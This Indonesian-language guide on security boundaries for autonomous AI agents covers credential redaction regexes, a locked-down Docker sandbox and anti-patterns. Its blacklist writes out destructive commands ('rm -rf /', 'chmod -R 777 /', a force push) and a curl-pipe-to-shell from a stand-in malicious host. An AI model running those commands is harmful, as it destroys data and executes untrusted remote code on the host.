# 🛡️ 10 — Security Boundaries & Credential Protection

> *"Keamanan bukan fitur tambahan — ia adalah fondasi dasar dari setiap tindakan otonom yang dilakukan oleh AI."*

---

## 📋 Daftar Isi

1. [Filosofi Keamanan Agen](#-filosofi-keamanan-agen)
2. [Arsitektur Batas Keamanan (Security Boundaries Architecture)](#-arsitektur-batas-keamanan-security-boundaries-architecture)
3. [Pencegahan Kebocoran Kredensial (Credential Leak Prevention)](#-pencegahan-kebocoran-kredensial-credential-leak-prevention)
4. [Eksekusi Perintah CLI yang Aman (Safe CLI Execution)](#-eksekusi-perintah-cli-yang-aman-safe-cli-execution)
5. [Regex untuk Sensor Kredensial Otomatis (Redaction Patterns)](#-regex-untuk-sensor-kredensial-otomatis-redaction-patterns)
6. [Konfigurasi Docker Terisolasi (Sandbox Containerization)](#-konfigurasi-docker-terisolasi-sandbox-containerization)
7. [Anti-Patterns Keamanan](#-anti-patterns-keamanan)

---

## 🎯 Filosofi Keamanan Agen

Ketika agen diberikan akses ke terminal dan sistem berkas, tanggung jawab keamanan berpindah ke agen. Agen harus bertindak secara defensif untuk menghindari kerusakan sistem atau kebocoran data sensitif. Setiap tindakan harus dievaluasi berdasarkan tingkat bahayanya terhadap sistem host.

---

## 🏗️ Arsitektur Batas Keamanan

Akses agen ke sistem harus dibatasi berdasarkan lapisan-lapisan keamanan berikut:

```
┌────────────────────────────────────────────────────────┐
│ [Internet / External Network]                          │
└───────────┬────────────────────────────────────────────┘
            │ Restricted by Firewall Rules
┌───────────▼────────────────────────────────────────────┐
│ [Agent Workspace Container]                            │
│  - No Access to Host SSH keys                          │
│  - Redacted Env Variables                              │
│  - Isolated Filesystem Subtree                         │
└───────────┬────────────────────────────────────────────┘
            │ Validated CLI Commands Only
┌───────────▼────────────────────────────────────────────┐
│ [Host System (Protected Layer)]                        │
└────────────────────────────────────────────────────────┘
```

---

## 🔑 Pencegahan Kebocoran Kredensial

Agen sering kali bekerja dengan file konfigurasi atau lingkungan yang mengandung rahasia (secrets).

### Aturan Emas Pencegahan Kebocoran:
1. **Jangan Pernah Menulis Secrets ke Log/Chat**: Jangan gunakan `echo` atau mencetak nilai dari `.env`, `config.json`, atau variabel lingkungan berisi token/password ke output chat.
2. **Gunakan `.gitignore` Secara Proaktif**: Sebelum membuat file baru yang berpotensi sensitif, pastikan file tersebut sudah terdaftar di `.gitignore`.
3. **Sensor Otomatis (Redaction)**: Lakukan pemindaian regex pada setiap output perintah sebelum mengirimkannya ke UI chat.

| Jenis Token | Lokasi Umum | Resiko Kebocoran |
| :--- | :--- | :--- |
| `OPENAI_API_KEY` | `.env`, `~/.bashrc` | Sangat Tinggi (Financial Abuse) |
| `GITHUB_TOKEN` | `.git/config`, `~/.gitconfig` | Tinggi (Write access to repos) |
| `DATABASE_URL` | `config/database.yml`, `.env` | Kritis (Data exfiltration) |

---

## 💻 Eksekusi Perintah CLI yang Aman

Eksekusi perintah terminal harus divalidasi secara ketat untuk mencegah perintah destruktif yang tidak disengaja.

### Panduan Eksekusi Terminal:
* **Verifikasi Direktori**: Selalu pastikan direktori kerja saat ini (`pwd`) adalah lokasi yang benar sebelum menjalankan perintah penghapusan atau instalasi global.
* **Hindari Wildcard Destruktif**: Dilarang menggunakan `rm -rf *` atau sejenisnya tanpa menentukan target spesifik secara mutlak.
* **Gunakan Mode Interaktif jika Memungkinkan**: Untuk tindakan irreversible, mintalah konfirmasi eksplisit dari pengguna.

### Contoh Command yang Dilarang (Blacklisted Commands):
```bash
# DO NOT EXECUTE - Destructive commands
rm -rf /
chmod -R 777 /
git push origin master --force
curl -sSL http://malicious-source.internal/install.sh | sh
```

---

## 🔍 Regex untuk Sensor Kredensial Otomatis

Untuk mencegah kebocoran kredensial secara tidak sengaja melalui output terminal, agen harus memindai teks menggunakan pola regex berikut sebelum menyajikan output kepada pengguna:

```python
import re

# Regex patterns for credential scrubbing
SECRET_PATTERNS = {
    "OpenAI API Key": r"sk-[a-zA-Z0-9]{48}",
    "GitHub Token": r"(ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36}",
    "Generic Password Assignment": r"(?i)(password|passwd|secret|api_key|token|auth)\s*[:=]\s*['\"][a-zA-Z0-9_\-\.\~]{8,}['\"]",
    "Private Key": r"-----BEGIN [A-Z]+ PRIVATE KEY-----[\s\S]+?-----END [A-Z]+ PRIVATE KEY-----"
}

def redact_secrets(text: str) -> str:
    redacted_text = text
    for key_name, pattern in SECRET_PATTERNS.items():
        redacted_text = re.sub(pattern, f"[REDACTED {key_name.upper()}]", redacted_text)
    return redacted_text
```

---

## 🐳 Konfigurasi Docker Terisolasi

Setiap eksekusi sandbox harus dikurung di dalam container Docker dengan batasan resource yang ketat:

```yaml
# docker-compose.sandbox.yml
version: '3.8'
services:
  agent-sandbox:
    image: node:18-alpine
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETUID
      - SETGID
    read_only: false
    tmpfs:
      - /tmp
      - /run
    volumes:
      - /root/agentfull/workspace:/workspace:rw
    working_dir: /workspace
    deploy:
      resources:
        limits:
          cpus: '0.50'
          memory: 512M
    network_mode: "none" # Block internet access to prevent exfiltration
```

---

## ⚠️ Anti-Patterns Keamanan

* ❌ **Hardcoding API Keys**: Menyimpan kredensial mentah di dalam kode sumber.
* ❌ **Mencetak Seluruh `env`**: Menjalankan perintah `printenv` atau `env` tanpa filter di dalam chat.
* ❌ **Menjalankan Script Tidak Dikenal**: Mengunduh dan mengeksekusi script langsung dari internet (`curl | sh`) tanpa melakukan inspeksi kode terlebih dahulu.
* ❌ **Elevated Privileges**: Menjalankan script uji menggunakan `sudo` tanpa batasan konteks command.
